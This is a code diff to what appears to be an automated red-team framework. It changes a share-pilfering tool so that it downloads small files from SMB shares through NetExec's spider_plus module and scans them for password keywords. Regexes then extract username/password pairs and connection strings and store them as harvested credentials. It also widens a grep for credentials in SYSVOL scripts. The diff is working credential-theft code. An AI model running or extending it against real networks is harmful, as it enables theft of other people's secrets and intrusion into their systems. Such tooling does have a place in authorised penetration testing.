@@ -26,6 +26,7 @@ from ares.tools.red.common import (
     PLACEHOLDER_PASSWORDS,
     AnyRedTeamState,
     add_credential_to_state,
+    fetch_remote_file,
     filter_users_file_remote,
     format_weakness_block,
     is_ntlm_hash,
@@ -1722,7 +1723,7 @@ class SharePilferingTools(Toolset):
         add_credential_to_state(self.state, cred, "credential_access", self.dispatcher)
 
     @dn.tool_method
-    def smbclient_spider(
+    def smbclient_spider(  # noqa: PLR0912
         self,
         target: str,
         share: str,
@@ -1770,14 +1771,77 @@ class SharePilferingTools(Toolset):
             "-M",
             "spider_plus",
             "-o",
-            "DOWNLOAD_FLAG=False",
+            "DOWNLOAD_FLAG=True",  # Enable file downloads
+            "MAX_FILE_SIZE=100KB",  # Download files up to 100KB
         ]
 
         try:
-            logger.info(f"[*] Spidering share {share} on {target}")
+            logger.info(f"[*] Spidering share {share} on {target} with downloads enabled")
             stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)
 
             result = stdout + "\n" + (stderr or "")
+
+            # Fetch spider JSON metadata from recon pod (spider_plus runs on recon)
+            import json
+
+            spider_dir = "/root/.nxc/modules/nxc_spider_plus"
+            json_file = f"{spider_dir}/{target}.json"
+
+            downloaded_content = []
+
+            # Fetch the JSON metadata from recon pod
+            json_bytes = fetch_remote_file(json_file, target_role="recon", timeout_seconds=30)
+            if json_bytes:
+                try:
+                    spider_data = json.loads(json_bytes.decode("utf-8", errors="ignore"))
+
+                    # Look for downloaded files in each share
+                    for share_name, share_data in spider_data.items():
+                        if isinstance(share_data, dict):
+                            for file_path, file_info in share_data.items():
+                                if (
+                                    isinstance(file_info, dict)
+                                    and file_info.get("size", 0) < 102400
+                                ):  # <100KB
+                                    # Fetch downloaded file from recon pod
+                                    # spider_plus downloads to: spider_dir/IP/SHARE/path
+                                    clean_path = file_path.lstrip("/\\").replace("\\", "/")
+                                    dl_path = f"{spider_dir}/{target}/{share_name}/{clean_path}"
+
+                                    file_bytes = fetch_remote_file(
+                                        dl_path, target_role="recon", timeout_seconds=30
+                                    )
+                                    if file_bytes:
+                                        try:
+                                            content = file_bytes.decode("utf-8", errors="ignore")
+                                            downloaded_content.append(
+                                                f"\n📄 FILE: {share_name}/{file_path}\n{'=' * 60}\n{content}\n{'=' * 60}"
+                                            )
+
+                                            # Check for credentials in the content
+                                            content_lower = content.lower()
+                                            if any(
+                                                kw in content_lower
+                                                for kw in [
+                                                    "password",
+                                                    "pwd",
+                                                    "credential",
+                                                    "secret",
+                                                    "pass=",
+                                                ]
+                                            ):
+                                                downloaded_content.append(
+                                                    f"⚠️ POTENTIAL CREDENTIALS FOUND IN {file_path}!"
+                                                )
+
+                                                # Auto-extract credentials if possible
+                                                self._extract_credentials_from_content(
+                                                    content, share_name, file_path
+                                                )
+                                        except Exception as e:
+                                            logger.debug(f"Could not decode {dl_path}: {e}")
+                except Exception as e:
+                    logger.debug(f"Could not parse spider JSON from recon: {e}")
 
             interesting_extensions = [".txt", ".xml", ".ini", ".cfg", ".ps1", ".config", ".kdbx"]
             interesting_files = []
@@ -1795,10 +1859,53 @@ class SharePilferingTools(Toolset):
                     + result
                 )
 
+            # Append downloaded file contents
+            if downloaded_content:
+                result += "\n\n🔍 DOWNLOADED FILE CONTENTS:\n" + "\n".join(downloaded_content)
+
             return result
 
         except Exception as e:
             return f"Share spider failed: {e}"
+
+    def _extract_credentials_from_content(
+        self, content: str, share_name: str, file_path: str
+    ) -> None:
+        """Try to extract credentials from file content and add to state."""
+        import re
+
+        # Common patterns for credentials in config files
+        patterns = [
+            # user:password or user=password
+            r'(?:user(?:name)?|login)\s*[=:]\s*["\']?([^\s"\']+)["\']?\s*(?:password|passwd|pwd|pass)\s*[=:]\s*["\']?([^\s"\']+)["\']?',
+            # password for user patterns
+            r'(?:password|passwd|pwd|pass)\s*(?:for\s+)?["\']?([^\s"\']+)["\']?\s*[=:]\s*["\']?([^\s"\']+)["\']?',
+            # SQL connection strings
+            r"User\s*Id\s*=\s*([^;]+);\s*Password\s*=\s*([^;]+)",
+            # Key=value in separate lines (common in INI files)
+            r"username\s*=\s*([^\r\n]+)[\r\n]+.*?password\s*=\s*([^\r\n]+)",
+        ]
+
+        for pattern in patterns:
+            matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
+            for match in matches:
+                groups = match.groups()
+                if len(groups) >= 2:
+                    username = groups[0].strip().strip("\"'")
+                    password = groups[1].strip().strip("\"'")
+                    if username and password and len(password) > 2:
+                        logger.info(
+                            f"🔑 Extracted credential from {share_name}/{file_path}: {username}"
+                        )
+                        cred = Credential(
+                            username=username,
+                            password=password,
+                            domain=self.state.target.domain
+                            if self.state and self.state.target
+                            else "",
+                            source=f"share_spider:{share_name}/{file_path}",
+                        )
+                        add_credential_to_state(self.state, cred, "share_spider", self.dispatcher)
 
     @dn.tool_method
     def gpp_password_finder(
@@ -1982,10 +2089,11 @@ class SharePilferingTools(Toolset):
                         )
 
                     # Search the downloaded file for password patterns
+                    # Also capture $user lines so multi-line credential extraction works
                     grep_cmd = [
                         "bash",
                         "-lc",
-                        "grep -iE '(password|passwd|pwd|cred|secret)\\s*[=:]' /tmp/sysvol_script.txt 2>/dev/null || true",
+                        "grep -iE '(password|passwd|pwd|cred|secret|user|username|usr)\\s*[=:]' /tmp/sysvol_script.txt 2>/dev/null || true",
                     ]
                     grep_stdout, _grep_stderr, _ = run_tool(grep_cmd, timeout_seconds=10)
                     grep_output = grep_stdout.strip()
